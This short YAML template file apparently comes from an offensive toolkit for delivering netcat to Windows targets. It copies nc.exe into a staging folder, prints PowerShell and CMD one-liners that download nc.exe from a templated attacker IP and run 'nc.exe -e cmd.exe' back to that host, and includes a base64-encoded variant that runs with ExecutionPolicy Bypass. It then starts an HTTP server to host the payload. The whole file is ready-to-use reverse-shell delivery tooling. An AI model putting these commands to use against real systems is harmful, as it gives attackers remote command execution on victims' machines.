---
metadata:
  filename: "deliver-windows-revshell-nc.exe.yaml"
  tags: ["shell", "windows"]
  created: "2025-03-29"
  author: "Unknown"

content: |
  mkdir -p packstation/outbound; cp -n /usr/share/windows-resources/binaries/nc.exe packstation/outbound; \
  echo '================================================================'; \
  echo '                      -----PowerShell-----                      '; \
  echo 'Deliver only: iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/nc.exe -Outfile {{ delivery_path_windows }}\nc.exe'; \
  echo 'Deliver + RevShell: iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/nc.exe -Outfile {{ delivery_path_windows }}\nc.exe; {{ delivery_path_windows }}\nc.exe -e cmd.exe {{ attacker_ip }} {{ shell_port }}'; \
  echo '================================================================'; \
  echo '                         -----CMD-----                          '; \
  echo 'Deliver only: powershell wget -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/nc.exe -Outfile {{ delivery_path_windows }}\nc.exe'; \
  echo 'Deliver + RevShell: powershell wget -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/nc.exe -Outfile {{ delivery_path_windows }}\nc.exe; {{ delivery_path_windows }}\nc.exe -e cmd.exe {{ attacker_ip }} {{ shell_port }}'; \
  echo 'Deliver + RevShell (encoded): powershell.exe -ExecutionPolicy Bypass -EncodedCommand {{ ("powershell wget -uri http://" ~ attacker_ip ~ ":" ~ delivery_outbound_port ~ "/nc.exe -Outfile " ~ delivery_path_windows ~ "\\nc.exe; " ~ delivery_path_windows ~ "\\nc.exe -e cmd.exe " ~ attacker_ip ~ " " ~ shell_port) | base64_pwsh }}'; \
  echo '================================================================'; \
  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound
